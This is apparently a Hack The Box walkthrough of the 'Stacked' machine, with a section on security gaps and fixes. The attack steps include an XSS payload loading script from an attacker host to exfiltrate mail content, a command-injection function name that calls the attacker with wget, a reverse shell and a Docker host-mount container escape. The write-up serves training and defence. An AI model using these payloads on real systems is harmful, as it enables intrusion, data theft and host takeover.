---
title: "Stacked HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T06:15:00Z
tags: ["insane-linux", "web", "xss", "localstack", "docker", "cve-2021-3200", "container-escape", "aws", "lambda", "privilege-escalation"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Stacked HTB machine featuring XSS exploitation, LocalStack CVE-2021-3200 command injection, Docker container privilege escalation, and container escape to host root"
---

# Stacked HTB - Insane Linux Box Walkthrough

{{< youtube aWXfEDIYZu8 >}}

## Exploitation Steps

1. **Initial Nmap Scan**: Perform an Nmap scan with default scripts and version enumeration on the target IP ([TARGET-IP]), revealing open ports 22 (SSH on Ubuntu) and 80 (HTTP on Apache/Ubuntu). The HTTP title indicates a redirect to stacked.htb.

2. **Hosts File Modification and Initial Browsing**: Add stacked.htb to the /etc/hosts file and browse http://stacked.htb, finding a static webpage with Bootstrap JavaScript and a non-functional "Notify Me" email form (identified as a rabbit hole).

3. **Directory and VHost Enumeration**: Run Gobuster for directory brute-forcing on stacked.htb (using raft-small-words.txt wordlist) and VHost enumeration (using subdomains-top1million-5000.txt). Also initiate a full port Nmap scan.

4. **VHost Discovery and Analysis**: Identify portfolio.stacked.htb from VHost scan results by analyzing anomalies in response sizes using awk, sort, and uniq. Add it to /etc/hosts and browse, revealing mentions of LocalStack (open-source AWS mock), a Docker Compose download link, and a contact form.

5. **Download and Analyze Docker Compose**: Download docker-compose.yml from portfolio.stacked.htb, noting LocalStack version 0.12.6, exposed ports (443, 4566, 4571, 8080 for web UI), Lambda usage, and no real authentication.

6. **Research LocalStack Vulnerabilities**: Search for LocalStack changelog (version 0.12.6 released February 2021) and CVEs, identifying CVE-2021-3200 (shell command injection in dashboard via function name parameter). Note ports 4566 and 8080 are not open in Nmap scans, suggesting indirect access.

7. **XSS Testing in Contact Form**: Intercept contact form submissions with Burp Suite, testing for XSS in fields like name, email, phone, subject, message, User-Agent, Referer, and Origin. Identify stored XSS in the Referer header by hosting a server and observing callbacks.

8. **Exploit XSS to Exfiltrate Data**: Craft a payload in Referer (e.g., `<script src="http://[ATTACKER-IP]/pwn.js"></script>`) to load custom JavaScript. Use pwn.js with XMLHttpRequest to fetch content from mail.stacked.htb (discovered via callback referrer) and exfiltrate it to attacker's server.

9. **Discover and Read Emails**: Add mail.stacked.htb to /etc/hosts. Modify pwn.js to fetch specific email content (readmail.php?id=1), revealing an S3 instance at s3-testing.stacked.htb.

10. **Access S3 Instance**: Add s3-testing.stacked.htb to /etc/hosts and browse, confirming it's a running LocalStack S3 endpoint (JSON response with status: running).

11. **Test Lambda Creation**: Use AWS CLI (configured with dummy keys) to create and invoke Lambda functions on http://s3-testing.stacked.htb endpoint, testing Node.js runtime with simple handlers to confirm execution.

12. **Exploit CVE-2021-3200 for RCE**: Leverage command injection in Lambda function name during creation (e.g., function-name="c;wget [ATTACKER-IP]:8000"). Use XSS to redirect victim browser to localhost:8080 (dashboard), but combine with AWS CLI invocation to trigger injection, gaining reverse shell in LocalStack Docker container as user 'localstack'.

13. **Enumerate Container with pspy**: Download and run pspy64 in the container (in /tmp due to noexec on /dev/shm) to monitor processes, observing root-executed Docker commands during Lambda creation/invocation.

14. **Root Privilege Escalation in Container**: Inject commands into Lambda handler or creation parameters (e.g., via wget in Docker create command) to confirm root execution, then craft a reverse shell payload in function name, gaining root shell in the container.

15. **Escape Container to Host Root**: As root in container, use Docker to list images/containers, then run a new container mounting host root filesystem (e.g., docker run -v /:/mnt --rm -it <image_id> chroot /mnt sh), accessing /mnt/root/root.txt or adding SSH key to /mnt/root/.ssh/authorized_keys for persistent root access on host.

## Security Gaps and Remediation

Based on the provided data, the following gaps in services or systems were exploited in the "Stacked" Hack The Box machine. Below, I outline each gap, its impact, and potential fixes, focusing on either source code or configuration changes to mitigate the vulnerabilities. The systems involved include the web application, LocalStack, and Docker, with specific issues in cross-site scripting (XSS), command injection, and container misconfigurations.

### 1. Stored Cross-Site Scripting (XSS) in Contact Form (Web Application)
**Gap**: The contact form on portfolio.stacked.htb does not sanitize or validate the Referer header, allowing stored XSS payloads to execute JavaScript in the victim's browser.

**Impact**: Attackers can exfiltrate sensitive data (e.g., email content from mail.stacked.htb) or redirect users to malicious endpoints, facilitating further exploitation.

**Fixes**:
- **Source Code Fix**:
  - Implement input sanitization for the Referer header (and other user inputs like name, email, phone, subject, message) to strip or escape malicious scripts (e.g., `<script>` tags). Use libraries like OWASP AntiSamy or DOMPurify to sanitize inputs.
  - Validate the Referer header against a whitelist of trusted domains to ensure it originates from legitimate sources.
  - Encode outputs in the application (e.g., HTML, JavaScript, or JSON contexts) to prevent script execution even if malicious input is stored.
- **Configuration Fix**:
  - Enable a Content Security Policy (CSP) header to restrict script sources (e.g., `script-src 'self'`) and block external or inline scripts.
  - Configure the web server (Apache) to filter or reject requests with suspicious headers using mod_security rules targeting patterns like `<script>` in Referer.

### 2. Command Injection in LocalStack Dashboard (CVE-2021-3200)
**Gap**: LocalStack version 0.12.6 allows shell command injection via the function name parameter in the Lambda creation process through the dashboard (accessible on localhost:8080), due to improper sanitization of input passed to shell commands.

**Impact**: Attackers can execute arbitrary commands in the LocalStack container, achieving code execution as the 'localstack' user and potentially escalating to root within the container.

**Fixes**:
- **Source Code Fix**:
  - In LocalStack's dashboard component, sanitize and validate the function name parameter to reject special characters (e.g., `;`, `|`, `&`) that enable command injection. Use a strict regex pattern (e.g., `^[a-zA-Z0-9_-]+$`) to allow only alphanumeric characters and safe symbols.
  - Avoid passing user inputs directly to shell commands; use parameterized APIs or safe execution methods (e.g., Python's `subprocess.run` with proper argument escaping).
  - Upgrade LocalStack to a version newer than 0.12.6 (e.g., 1.4.1 or later), where this CVE is patched (per changelog analysis).
- **Configuration Fix**:
  - Restrict access to the LocalStack dashboard (port 8080) by configuring it to bind only to trusted interfaces (e.g., `127.0.0.1`) and requiring authentication.
  - Implement network-level access controls (e.g., iptables or firewall rules) to block external access to port 8080, preventing unauthorized users from reaching the dashboard.

### 3. Lack of Authentication in LocalStack AWS API
**Gap**: LocalStack does not enforce proper authentication for AWS API endpoints (e.g., Lambda creation on s3-testing.stacked.htb), accepting any API key without validation, as it's designed for development.

**Impact**: Attackers can interact with LocalStack's AWS services (e.g., create Lambda functions) without credentials, enabling command injection or data access.

**Fixes**:
- **Source Code Fix**:
  - Modify LocalStack to enforce proper AWS-compatible authentication, validating access keys and signatures against a configured IAM policy, even in development mode.
  - Introduce an optional authentication layer for API endpoints, requiring a valid API key or token for sensitive operations like Lambda creation.
- **Configuration Fix**:
  - Configure LocalStack with a custom authentication plugin or environment variable to enable strict API key validation (available in newer versions).
  - Use network segmentation or a reverse proxy (e.g., Nginx) with authentication to restrict access to LocalStack endpoints (e.g., port 4566 or s3-testing.stacked.htb).

### 4. Exposure of Sensitive Endpoints via Virtual Host Routing
**Gap**: Virtual hosts (e.g., portfolio.stacked.htb, mail.stacked.htb, s3-testing.stacked.htb) are publicly accessible and discoverable via enumeration, exposing sensitive functionality like the contact form and S3 endpoint.

**Impact**: Attackers can enumerate and access hidden services, leading to XSS, data exposure, or further exploitation of LocalStack vulnerabilities.

**Fixes**:
- **Source Code Fix**:
  - Implement access controls in the web application to restrict virtual host endpoints to authorized users (e.g., require session-based authentication).
  - Remove or obfuscate references to internal endpoints (e.g., s3-testing.stacked.htb in emails) to reduce discoverability.
- **Configuration Fix**:
  - Configure Apache to restrict access to virtual hosts using IP whitelisting or authentication (e.g., `.htaccess` with `Require ip` or Basic Auth).
  - Disable directory indexing and hide server banners (e.g., `ServerTokens Prod` and `ServerSignature Off` in Apache) to reduce information leakage during enumeration.

### 5. Docker Container Running as Root
**Gap**: The LocalStack Docker container runs processes (e.g., Lambda execution) with root privileges, and the container has access to Docker's socket, allowing root-level commands on the host.

**Impact**: Once attackers gain code execution in the container, they can escalate to root within the container and escape to the host by mounting the host filesystem or running privileged Docker commands.

**Fixes**:
- **Source Code Fix**:
  - Modify LocalStack's Docker image to run as a non-root user by default, using a dedicated user (e.g., `localstack`) with minimal privileges for Lambda execution and dashboard operations.
  - Remove or restrict access to Docker socket bindings in the LocalStack codebase unless explicitly needed.
- **Configuration Fix**:
  - Update the Docker Compose file to run the LocalStack container with a non-root user (e.g., `user: "1000:1000"`) and drop capabilities (e.g., `cap_drop: all`).
  - Remove Docker socket access (`/var/run/docker.sock`) from the container's volume mounts to prevent container escape.
  - Apply user namespaces in Docker (`--userns-remap`) to isolate container processes from the host's root user.

### 6. Noexec Mount on /dev/shm Not Applied Universally
**Gap**: The /dev/shm directory has a `noexec` mount, preventing execution of binaries, but /tmp does not, allowing attackers to execute downloaded tools like pspy64.

**Impact**: Attackers can execute malicious binaries in /tmp, facilitating enumeration and privilege escalation within the container.

**Fixes**:
- **Configuration Fix**:
  - Configure the Docker container to mount /tmp with `noexec` (e.g., `tmpfs /tmp tmpfs noexec,nosuid,nodev`) in the Docker Compose file or container runtime options.
  - Apply system-wide mount options to ensure all temporary directories (e.g., /tmp, /var/tmp) have `noexec` enabled on the host.

### 7. Lambda Function Deletion and Reuse
**Gap**: Lambda functions in LocalStack are periodically deleted (every few minutes), but function names can be reused without validation, allowing attackers to inject malicious payloads repeatedly.

**Impact**: Attackers can persistently exploit command injection by creating new functions with malicious names, bypassing temporary deletions.

**Fixes**:
- **Source Code Fix**:
  - Implement validation in LocalStack to prevent reuse of recently deleted function names or track function creation history to detect suspicious patterns.
  - Add rate-limiting or throttling for Lambda function creation to slow down automated attacks.
- **Configuration Fix**:
  - Configure LocalStack to enforce stricter function name policies (e.g., unique identifiers tied to a session) or disable automatic function deletion in development environments.
  - Monitor and log Lambda creation requests to detect and block repeated malicious attempts.

### 8. Exposure of Docker Compose File
**Gap**: The Docker Compose file is publicly downloadable from portfolio.stacked.htb, revealing LocalStack version (0.12.6), ports, and configuration details.

**Impact**: Attackers gain insight into the environment, including version-specific vulnerabilities and exposed ports, aiding targeted exploitation.

**Fixes**:
- **Source Code Fix**:
  - Remove or restrict access to the Docker Compose download endpoint in the web application, requiring authentication or removing it entirely.
- **Configuration Fix**:
  - Move sensitive configuration files to a restricted directory outside the web root (e.g., not under /var/www/html).
  - Configure Apache to deny access to sensitive file extensions (e.g., `*.yml`) using `FilesMatch` directives in the configuration.

## Summary

These gaps primarily stem from insecure development practices (e.g., lack of input validation in LocalStack and the web application) and misconfigurations in the web server and Docker setup. Applying the recommended source code fixes (sanitization, authentication, non-root execution) and configuration changes (access controls, mount restrictions, CSP) would significantly harden the system against the exploited attack vectors. For LocalStack, upgrading to a patched version and enforcing authentication are critical, as it's not intended for production use but was exposed in a vulnerable state.

## Conclusion

Stacked is an excellent machine that demonstrates the complexity of modern containerized application security. It requires expertise in:
- Web application security and cross-site scripting exploitation
- CVE research and vulnerability analysis
- AWS service simulation and LocalStack exploitation
- Docker container security and escape techniques
- Process monitoring and privilege escalation

The machine emphasizes the importance of proper input validation, secure container configuration, and the risks of exposing development tools in production environments.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*